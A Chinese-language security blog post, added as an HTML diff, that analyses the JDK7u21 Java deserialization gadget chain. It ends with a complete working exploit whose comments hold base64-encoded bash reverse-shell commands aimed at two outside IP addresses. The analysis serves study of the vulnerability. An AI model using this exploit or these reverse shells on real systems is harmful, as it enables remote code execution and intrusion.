@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Java反序列化之JDK7u21分析 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Java反序列化之JDK7u21分析</h1>
+    <div class="post-meta">
+      <time datetime="2025-07-28">2025-07-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19008375">https://www.cnblogs.com/Zephyr07/articles/19008375</a></p>
+</blockquote>
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前的分析链子大多都是基于了<code>InvokerTransformer</code> 和 <code>TemplatesImpl</code>这两个类去进行恶意加载或者命令执行，同样在jdk7u21这条链子中同样是用到了TemplatesImpl去实现</p>
+<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>因为这是一条基于java本身版本的链子，所以不需要导入什么依赖，只需要jdk的版本是7u21即可</p>
+<p>下载链接：</p>
+<h2 id="复现流程："><a href="#复现流程：" class="headerlink" title="复现流程："></a>复现流程：</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163601801-1784885959.png" alt="image"></p>
+<p>首先看一下y<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/tree/master">soseria</a>l里面的链子</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163613033-891633242.png" alt="image"></p>
+<p>我们发现后半部分和我们之前分析的templatesImpl那部分是相同的，只是前半部分不相同，而这次我们发现入口类是LinkedHashSet的父类的HashSet的readobject</p>
+<p>断点下到HashSet的readobject里面</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163621744-1576032676.png" alt="image"></p>
+<p>然后走到最后跟进put方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163631252-591877203.png" alt="image"></p>
+<p>因为table是null，所以会跳过for循环</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163636908-1750948851.png" alt="image"></p>
+<p>然后跟到addEntry方法里面</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163643854-1664760036.png" alt="image"></p>
+<p>这里看到key就是TemplatesImpl的实例方法，value是一个空的object对象</p>
+<p>然后当我们一次一次点步过的时候，会发现第二次还会走到hashmap的put方法这里，但是这次我们会发现table不再是空，这次for循环就可以走进去</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163649852-1117807784.png" alt="image"></p>
+<p>走进for循环的话，这时候就会调用key的equals方法，当我们跟进去这个equals方法，发现直接到了AnnotationInvocationHandler的invoke方法，说明这里有动态代理的调用</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163656395-1440669477.png" alt="image"></p>
+<p>然后检查调用的方法是否是equals方法，是的话就会调用equalsImpl()方法，跟进去看看</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163701627-1147171719.png" alt="image"></p>
+<p>在这里就会经过一连串的invoke调用，最一开始是TemplatesImpl.getOutputProperties()，但到了最后就是newTransformer().getOutputProperties()</p>
+<p>然后后面就是简单的动态加载类，最后就能弹计算器了</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202507/3551469-20250731163710849-2079888495.png" alt="image"></p>
+<p>最后的exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class jdk7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;Drunkbaby&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line">        // new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;  </span><br><span class="line">        byte[] evil = getTemplatesImpl(&quot;Calc&quot;);</span><br><span class="line">        byte[][] codes = &#123;evil&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line"></span><br><span class="line">        String evilHashCode = &quot;f5a5a608&quot;;</span><br><span class="line">        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值  </span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(evilHashCode,&quot;Drunkbaby&quot;);</span><br><span class="line"></span><br><span class="line">        // 下面部分搞动态代理，反射获取 AnnotationInvocationHandler 类，再实例化  </span><br><span class="line"></span><br><span class="line">        Class handler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = handler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Templates.class, hashMap);</span><br><span class="line"></span><br><span class="line">        // 创建动态代理  </span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(jdk7u21.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        // 准备入口类 LinkedHashSet  </span><br><span class="line">        HashSet hashSet = new LinkedHashSet();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line"></span><br><span class="line">        // 将恶意templates设置到map中  </span><br><span class="line">        hashMap.put(evilHashCode, templates);</span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        deserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object deserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            CtClass ctClass = pool.makeClass(&quot;Evil&quot;);</span><br><span class="line">            CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            CtConstructor constructor = ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(&quot; try &#123;\n&quot; +</span><br><span class="line">                    &quot; Runtime.getRuntime().exec(\&quot;&quot; + cmd +</span><br><span class="line">                    &quot;\&quot;);\n&quot; +</span><br><span class="line">                    &quot; &#125; catch (Exception ignored) &#123;\n&quot; +</span><br><span class="line">                    &quot; &#125;&quot;);</span><br><span class="line">            // &quot;new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;  </span><br><span class="line">            byte[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            return bytes;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return new byte[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2><ol>
+<li>为什么evilHashCode的值要设置成f5a5a608？</li>
+</ol>
+<p>        解决：这是因为TemplatesImpl也就是上面所说的key在hashcode之后的值就是f5a5a608</p>
+<ol start="2">
+<li>那为什么就必须一样呢？</li>
+</ol>
+<p>        解决：这是因为在java readobject恢复对象的时候，set对象中是不允许重复的，所以在添加的对象的时候科宁会有一个比较的操作，当两个对象的hashcode值检测到一样的时候就会对key调用equals方法，那这时候如果我们用AnnotationInvocationHandler代理TemplatesImpl，那在调用equals方法并触发invoke方法，这时候就会调用equalsImpl方法，而在这个方法中会遍历type(TemplatesImpl)中的每个方法，这时候就会触发<code>newTransform()</code> 或getOutputProperties()方法导致字节码加载任意代码的执行</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/07/28/java%E5%AE%89%E5%85%A8%E4%B9%8BMysql_JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" class="prev">← java安全之Mysql_JDBC反序列化分析</a>
+    
+    
+      <a href="/2025/07/25/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE_2020_1957-CVE-2020-13933/" class="next">shiro权限绕过漏洞分析-CVE_2020_1957/CVE-2020-13933 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
